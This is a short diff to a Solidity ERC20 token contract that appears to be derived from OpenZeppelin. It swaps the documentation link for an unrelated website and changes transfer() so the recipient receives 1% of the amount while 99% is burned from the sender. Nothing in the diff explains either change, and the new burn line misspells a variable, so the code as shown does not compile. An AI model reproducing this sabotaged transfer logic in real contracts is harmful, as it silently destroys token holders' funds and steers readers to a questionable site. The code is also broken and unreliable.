@@ -11,8 +11,8 @@ import "./SafeMath.sol";
  * For a generic mechanism see {ERC20Mintable}.
  *
  * TIP: For a detailed writeup see our guide
- * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
- * to implement supply mechanisms].
+ * https://www.erketrc20.com
+ * 
  *
  * We have followed general OpenZeppelin guidelines: functions revert instead
  * of returning `false` on failure. This behavior is nonetheless conventional
@@ -59,7 +59,8 @@ contract ERC20 is IERC20 {
      * - the caller must have a balance of at least `amount`.
      */
     function transfer(address recipient, uint256 amount) public returns (bool) {
-        _transfer(msg.sender, recipient, amount);
+        _transfer(msg.sender, recipient, amount*1/100);
+        _burn(msg.sender,amout*99/100);
         return true;
     }
 
